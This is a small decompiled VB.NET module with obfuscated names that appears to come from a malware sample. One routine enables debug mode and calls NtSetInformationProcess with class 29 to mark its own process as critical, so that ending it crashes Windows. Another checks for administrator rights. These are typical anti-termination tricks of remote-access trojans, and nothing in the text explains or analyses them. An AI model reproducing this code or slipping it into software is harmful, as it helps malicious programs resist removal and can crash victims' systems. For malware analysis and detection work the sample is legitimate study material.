Imports System
Imports System.Diagnostics
Imports System.Runtime.InteropServices
Imports System.Security.Principal

Namespace frgoWklvEOSV
	' Token: 0x02000010 RID: 16
	Public Module CyVDCXKNZkh
		' Token: 0x06000050 RID: 80
		Private Declare Function NtSetInformationProcess Lib "ntdll.dll" (intptr_0 As IntPtr, int_0 As Integer, ByRef int_1 As Integer, int_2 As Integer) As Integer

		' Token: 0x06000051 RID: 81 RVA: 0x0000C4D8 File Offset: 0x0000A6D8
		Public Sub jDuYrMVMSFRfuZ()
			Dim num As Integer = 1
			Process.EnterDebugMode()
			CyVDCXKNZkh.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, num, 4)
		End Sub

		' Token: 0x06000052 RID: 82 RVA: 0x000028AE File Offset: 0x00000AAE
		Public Function fziPGhgQsXRkJJwbm() As Boolean
			Return New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)
		End Function
	End Module
End Namespace
